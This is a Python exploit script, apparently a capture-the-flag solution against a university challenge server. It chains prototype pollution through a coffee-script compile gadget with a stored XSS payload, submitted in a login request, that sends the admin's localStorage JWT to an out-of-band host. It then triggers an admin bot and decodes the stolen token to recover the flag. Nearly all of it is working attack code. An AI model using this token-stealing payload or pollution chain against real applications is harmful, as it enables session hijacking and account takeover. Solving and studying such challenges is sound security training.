import requests
import base64
import json

domain = "http://netx9.cs.jhu.edu:8399/"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close"
}

"""
    Step One:
    1/ Pollute the prototype and leveage the gadget within coffee-script compile function

    For the web host, we can use this service: https://app.interactsh.com/
    However, it should be noted that this website is blocked by the firewall of the school. So, try to use other network to access the website or set up your own web host.
"""
data = {
    "username": ["__proto__", "indent"],
    "password": "<img src='x' onerror=this.src='http://ckqrv9x2vtc00009ycb0gj5hpiryyyyyb.oast.fun?jwt='+localStorage.getItem('jwtToken')>"
}
response = requests.post(domain+"login", headers=headers, json=data)

"""
    Step Two:
    2/ Ask the admin bot to visit the page and get the jwtToken
"""
response = requests.get(domain+"admin", headers=headers)


"""
    Step Three:
    3/ One we got the admin's jwtToken through the XSS, let's decode and get the flag!
"""
admin_jwtToken = "$YOUR_JWT_TOKEN"

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT does not have 3 parts!")

    # Decode header and payload
    header = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8"))
    payload = json.loads(base64.b64decode(parts[1] + "==").decode("utf-8"))
    
    return header, payload

header, payload = decode_jwt(admin_jwtToken)
print("Header:", header)
print("Payload:", payload)